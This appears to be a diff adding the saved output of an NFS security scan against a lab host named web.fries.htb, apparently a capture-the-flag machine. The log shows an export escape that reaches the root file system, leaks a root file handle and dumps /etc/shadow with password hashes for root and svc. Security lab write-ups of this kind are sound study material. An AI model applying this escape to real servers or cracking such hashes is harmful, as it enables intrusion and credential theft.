@@ -1,0 +1,102 @@
+Checking host 192.168.100.2
+Supported protocol versions reported by portmap:
+Protocol          Versions  
+portmap           2, 3, 4   
+mountd            1, 2, 3   
+status monitor 2  1         
+nfs               3, 4      
+nfs acl           3         
+nfs lock manager  1, 3, 4   
+
+Available Exports reported by mountd:
+Directory           Allowed clients  Auth methods  Export file handle                                        
+/srv/web.fries.htb  *[91m(wildcard)[0m      [91msys[0m           0100070001000a00000000008a01da16c18a400cbc9b37e3567d3fba  
+
+Connected clients reported by mountd:
+Client               Export              
+192.168.100.2[91m(down)[0m  /srv/web.fries.htb  
+
+Supported NFS versions reported by nfsd:
+Version  Supported  
+3        Yes        
+4.0      Yes        
+4.1      Yes        
+4.2      Yes        
+
+NFSv3 Windows File Handle Signing: [92mOK[0m, server probably not Windows, File Handle not 32 bytes long
+
+Trying to escape exports
+Export: /srv/web.fries.htb: file system type ext/xfs, parent: None, 655363
+[91mEscape successful, root directory listing:[0m
+[91mlib64 mnt sys etc proc lib snap lost+found media tmp dev var .bash_history .. swap.img srv home libx32 bin root usr . sbin lib32 opt boot run[0m
+[91mRoot file handle: 0100070201000a00000000008a01da16c18a400cbc9b37e3567d3fba02000000000000000200000000000000[0m
+
+[91mGID of shadow group: 42[0m
+[91mContent of /etc/shadow:[0m
+[91mroot:$y$j9T$yqbmFwMbHh7qoaRaY3jx..$FMFv9upB20J4yPWwAJxndkOA4zzrn5/Udv4BF9LbLq/:20239:0:99999:7:::
+daemon:*:19579:0:99999:7:::
+bin:*:19579:0:99999:7:::
+sys:*:19579:0:99999:7:::
+sync:*:19579:0:99999:7:::
+games:*:19579:0:99999:7:::
+man:*:19579:0:99999:7:::
+lp:*:19579:0:99999:7:::
+mail:*:19579:0:99999:7:::
+news:*:19579:0:99999:7:::
+uucp:*:19579:0:99999:7:::
+proxy:*:19579:0:99999:7:::
+www-data:*:19579:0:99999:7:::
+backup:*:19579:0:99999:7:::
+list:*:19579:0:99999:7:::
+irc:*:19579:0:99999:7:::
+gnats:*:19579:0:99999:7:::
+nobody:*:19579:0:99999:7:::
+_apt:*:19579:0:99999:7:::
+systemd-network:*:19579:0:99999:7:::
+systemd-resolve:*:19579:0:99999:7:::
+messagebus:*:19579:0:99999:7:::
+systemd-timesync:*:19579:0:99999:7:::
+pollinate:*:19579:0:99999:7:::
+sshd:*:19579:0:99999:7:::
+syslog:*:19579:0:99999:7:::
+uuidd:*:19579:0:99999:7:::
+tcpdump:*:19579:0:99999:7:::
+tss:*:19579:0:99999:7:::
+landscape:*:19579:0:99999:7:::
+fwupd-refresh:*:19579:0:99999:7:::
+usbmux:*:19589:0:99999:7:::
+svc:$y$j9T$Y7j3MSqEJTcNTqSSVJRS2.$h0AFlCXKB9V0PZ.BIyZKSGR6WFJWlxIRiqK.JLOB4PD:20238:0:99999:7:::
+lxd:!:19589::::::
+_rpc:*:20234:0:99999:7:::
+statd:*:20234:0:99999:7:::
+dnsmasq:*:20234:0:99999:7:::
+barman:*:20236:0:99999:7:::
+sssd:*:20238:0:99999:7:::
+[0m
+Checking no_root_squash
+Export              no_root_squash  
+/srv/web.fries.htb  [92mDISABLED[0m        
+
+NFSv4 overview and auth methods (incomplete)
+srv: pseudo
+    web.fries.htb: [91msys[0m
+        shared: [91msys[0m
+        certs: [91msys[0m
+        webroot: [91msys[0m
+
+NFSv4 guessed exports (Linux only, may differ from /etc/exports):
+Directory           Auth methods  Export file handle                                        
+/srv/web.fries.htb  [91msys[0m           0100070001000a00000000008a01da16c18a400cbc9b37e3567d3fba  
+
+
+Trying to guess server OS
+OS       Property                                      Fulfilled  
+Linux    File Handles start with 0x0100                [92mYes[0m        
+Windows  NFSv3 File handles are 32 bytes long          [91mNo[0m         
+Windows  Only NFS versions 3 and 4.1 supported         [91mNo[0m         
+FreeBSD  Mountd reports subnets without mask           [93mUnknown[0m    
+NetApp   netapp partner protocol supported             [91mNo[0m         
+HP-UX    Only one request per TCP connection possible  [91mNo[0m         
+
+Final OS guess: Linux
+
